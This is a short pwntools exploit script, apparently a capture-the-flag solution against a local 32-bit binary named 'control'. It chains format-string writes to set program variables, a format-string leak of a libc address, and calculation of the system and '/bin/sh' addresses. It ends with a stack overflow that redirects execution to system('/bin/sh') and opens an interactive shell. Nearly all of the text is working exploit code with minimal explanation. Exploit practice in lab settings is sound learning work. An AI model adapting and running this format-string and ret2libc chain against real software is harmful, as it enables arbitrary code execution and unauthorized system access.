from pwn import *
target=process('./control')
context.terminal=["tmux","split","-h"]
gdb.attach(target)
libc=ELF('/lib32/libc.so.6')
print(target.recvuntil("name\n"))
mainaddr=0x8049192
v2=0x0804C010
v1=0x0804C008
# increase v2=4
payload=p32(v2)+"%6$n"
target.sendline(payload)
print(target.recv())
# leak libc
payload="%19$#010x"
target.sendline(payload)

libc_start_main=int(target.recv(10),16)-241
print(hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
print(hex(libc_system))
libc_binsh=libc_base+libc.search("/bin/sh").next()
print(hex(libc_binsh))
popret=0x080492a3
# increase v1=68
payload=p32(v1)+"%064x"+"%6$n"
target.sendline(payload)
print(target.recv())
# overwrite eip
payload="A"*52+p32(libc_system)+p32(popret)+p32(libc_binsh)+"\x00"
target.sendline(payload)
print(target.recv())
target.interactive()

